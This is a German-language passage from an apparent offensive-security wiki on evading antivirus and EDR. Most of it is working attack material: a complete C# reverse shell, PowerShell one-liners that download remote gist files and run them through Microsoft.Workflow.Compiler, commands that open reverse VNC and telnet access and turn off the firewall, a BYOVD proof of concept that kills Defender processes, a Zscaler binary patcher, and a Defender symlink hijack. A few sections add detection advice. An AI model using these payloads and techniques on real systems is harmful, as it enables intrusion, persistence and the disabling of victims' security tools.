<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **trusted** signing certificate signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass Ihre payloads das Mark of The Web erhalten, besteht darin, sie in einem Container wie beispielsweise einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **non NTFS** Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die **`EtwEventWrite`**-Funktion des User-Space-Prozesses so zu verändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dies wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

Mehr Informationen findest du in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries in den Speicher ist seit einiger Zeit bekannt und ist immer noch eine sehr gute Methode, um Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Vorgehensweisen:

- **Fork\&Run**

Dabei wird **ein neuer Opferprozess gestartet**, dein Post-Exploitation-Schadcode in diesen neuen Prozess injiziert, der Schadcode ausgeführt und nach Abschluss der neue Prozess beendet. Das hat Vor- und Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantats erfolgt. Das bedeutet, dass, wenn bei einer unserer Post-Exploitation-Aktionen etwas schiefgeht oder entdeckt wird, die **Wahrscheinlichkeit, dass unser Implantat überlebt, deutlich größer ist.** Der Nachteil ist, dass die **Wahrscheinlichkeit**, von **Behavioural Detections** erwischt zu werden, größer ist.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der Post-Exploitation-Schadcode **in den eigenen Prozess injiziert**. Auf diese Weise kann man vermeiden, einen neuen Prozess zu erstellen und diesen von AV scannen zu lassen; der Nachteil ist jedoch, dass, wenn bei der Ausführung des Payloads etwas schiefgeht, die **Wahrscheinlichkeit, deinen Beacon zu verlieren, deutlich größer ist**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über C# Assembly-Loading lesen möchtest, siehe diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff auf die **auf dem vom Angreifer kontrollierten SMB-Share installierte Interpreter-Umgebung** gewährt.

Durch das Gewähren von Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share kannst du beliebigen Code in diesen Sprachen im Speicher der kompromittierten Maschine ausführen.

Das Repo gibt an: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen unverschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer ermöglicht, das **Access-Token oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, sodass dessen Privilegien reduziert werden: der Prozess stirbt nicht, hat aber nicht mehr die Berechtigungen, um nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **verhindern, dass externe Prozesse** Handles auf die Tokens von Sicherheitsprozessen erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Beachte den pin-Parameter, mit dem sich die PIN einstellen lässt, ohne die GUI zu verwenden.)

## Advanced Evasion

Evasion ist ein sehr komplexes Thema; manchmal musst du viele verschiedene Telemetriequellen in einem System berücksichtigen, weshalb es in reifen Umgebungen praktisch unmöglich ist, völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, welches **Teile des Binaries entfernt**, bis es **herausfindet, welchen Teil Defender als bösartig einstuft** und es für dich aufteilt.\
Ein weiteres Tool, das **das Gleiche macht**, ist [**avred**](https://github.com/dobin/avred) mit einem öffentlichen Webangebot unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du (als Administrator) installieren konntest, indem du folgendes ausführst:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es beim Systemstart **starten** und **führe** es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändere telnet-Port** (stealth) und deaktiviere Firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du möchtest die Bin-Downloads, nicht das Setup)

**ON THE HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort für _VNC Password_
- Setze ein Passwort für _View-Only Password_

Dann verschiebe die Binärdatei _**winvnc.exe**_ und die **neu erstellte** Datei _**UltraVNC.ini**_ auf das **victim**

#### **Reverse connection**

Der **attacker** sollte in seinem **host** die Binary `vncviewer.exe -listen 5900` ausführen, damit er vorbereitet ist, eine reverse **VNC connection** abzufangen. Dann, auf dem **victim**: Starte den winvnc daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNING:** Um unauffällig zu bleiben, darfst du ein paar Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Überprüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) öffnen
- Führe nicht `winvnc -h` aus, sonst erscheint ein [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Im Inneren von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nun **start the lister** mit `msfconsole -r file.rc` und **führe** die **xml payload** mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender beendet den Prozess sehr schnell.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwende es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Verwendung von python zum Erstellen von injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space beenden

Storm-2603 nutzte ein kleines Konsolen-Tool namens **Antivirus Terminator**, um Endpoint-Schutzmaßnahmen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht diesen, um privilegierte Kernel-Operationen auszuführen, die nicht einmal Protected-Process-Light (PPL) AV-Services blockieren können.

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte geschriebene Datei heißt `ServiceMouse.sys`, aber das Binary ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er selbst bei aktivierter Driver-Signature-Enforcement (DSE) geladen.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Benutzermodus zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
| IOCTL code | Funktion |
|-----------:|-----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess per PID beenden (wird verwendet, um Defender/EDR-Services zu terminieren) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimaler C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, diese beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmechanismen.

Erkennung / Gegenmaßnahmen
• Aktivieren Sie Microsofts Liste blockierter verwundbarer Treiber (`HVCI`, `Smart App Control`), sodass Windows das Laden von `AToolsKrnl64.sys` verweigert.  
• Überwachen Sie die Erstellung neuer *Kernel*-Services und alarmieren Sie, wenn ein Treiber aus einem weltweit beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
• Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objects, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung der Zscaler Client Connector Posture-Prüfungen durch On-Disk Binary-Patching

Zscalers **Client Connector** wendet Device-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei schwache Design-Entscheidungen ermöglichen eine vollständige Umgehung:

1. Die Posture-Bewertung erfolgt **vollständig clientseitig** (ein boolescher Wert wird an den Server gesendet).  
2. Interne RPC-Endpunkte prüfen nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch **das Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binärdatei | Ursprüngliche Logik gepatcht | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als compliant gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nach dem Ersetzen der Originaldateien und dem Neustarten des Service-Stacks:

* **All** posture checks display **green/compliant**.
* Nicht signierte oder veränderte Binaries können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich- oder höherstufige geschützte Prozesse sich gegenseitig manipulieren können. Aus offensiver Sicht: Wenn du legitimerweise ein PPL-fähiges Binary starten und seine Argumente kontrollieren kannst, kannst du harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL abgesichertes Schreib-Primitive gegen geschützte Verzeichnisse von AV/EDR verwandeln.

Wodurch ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden, wobei die Flags verwendet werden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ein kompatibles Protection Level muss angefordert werden, das zum Signer des Binaries passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen beim Erstellen zum Fehler.

Siehe auch eine umfassendere Einführung in PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-source-Helfer: CreateProcessAsPPL (wählt den Protection Level und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` erzeugt sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn es als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Orte zu verweisen.

8.3 short path helpers
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergebe das ClipUp-Log-Pfad-Argument, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn das Ziel-Binary normalerweise vom AV während der Ausführung geöffnet/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten, bevor der AV startet, indem du einen Auto-Start-Service installierst, der verlässlich früher läuft. Validere die Boot-Reihenfolge mit Process Monitor (boot logging).
4) Beim Reboot erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Anmerkungen und Einschränkungen
- Sie können den von ClipUp geschriebenen Inhalt nur in Bezug auf die Platzierung kontrollieren; dieser Mechanismus eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokalen Administrator/SYSTEM-Rechte, um einen Dienst zu installieren/starten und ein Neustartfenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Bootzeit vermeidet Dateisperren.

Erkennung
- Erstellung von Prozessen `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der Parent-Prozess kein Standard-Launcher ist, rund um den Bootvorgang.
- Neue Dienste, die so konfiguriert sind, dass verdächtige Binärdateien automatisch starten und konsequent vor Defender/AV starten. Untersuchen Sie Dienst-Erstellung/-Änderung vor Defender-Startfehlern.
- Dateiintegritätsüberwachung auf Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: suchen Sie nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomalem PPL-Level-Einsatz durch Nicht-AV-Binärdateien.

Abhilfemaßnahmen
- WDAC/Code Integrity: beschränken, welche signierten Binärdateien als PPL laufen dürfen und unter welchen Parent-Prozessen; blockieren Sie ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service-Hygiene: Beschränken Sie die Erstellung/Änderung von Auto-Start-Diensten und überwachen Sie Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender-Tamper-Schutz und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf Binärdateikorruption hinweisen.
- Erwägen Sie, die 8.3-Kurznamensgenerierung auf Volumes, die Security-Tools hosten, zu deaktivieren, falls dies mit Ihrer Umgebung kompatibel ist (gründlich testen).

Referenzen für PPL und tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulation von Microsoft Defender durch Platform Version Folder Symlink Hijack

Windows Defender wählt die Plattform, von der es ausgeführt wird, durch Auflisten der Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem lexikografisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet dann die Defender-Service-Prozesse von dort (aktualisiert die Service-/Registry-Pfade entsprechend). Diese Auswahl vertraut Verzeichniseinträgen, einschließlich directory reparse points (symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen für Angreifer beschreibbaren Pfad umzuleiten und DLL-Sideloading oder Dienstunterbrechung zu erreichen.

Voraussetzungen
- Lokaler Administrator (benötigt, um Verzeichnisse/symlinks im Platform-Ordner zu erstellen)
- Fähigkeit zum Neustart oder Auslösen der Defender Platform-Neuauswahl (Dienstneustart beim Boot)
- Nur integrierte Tools erforderlich (mklink)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber seine Plattformauswahl vertraut Verzeichniseinträgen und wählt die lexikografisch höchste Version, ohne zu validieren, dass das Ziel auf einen geschützten/vertrauten Pfad aufgelöst wird.

Schritt-für-Schritt (Beispiel)
1) Bereiten Sie einen beschreibbaren Klon des aktuellen Platform-Ordners vor, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Symlink zu einem Verzeichnis mit höherer Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
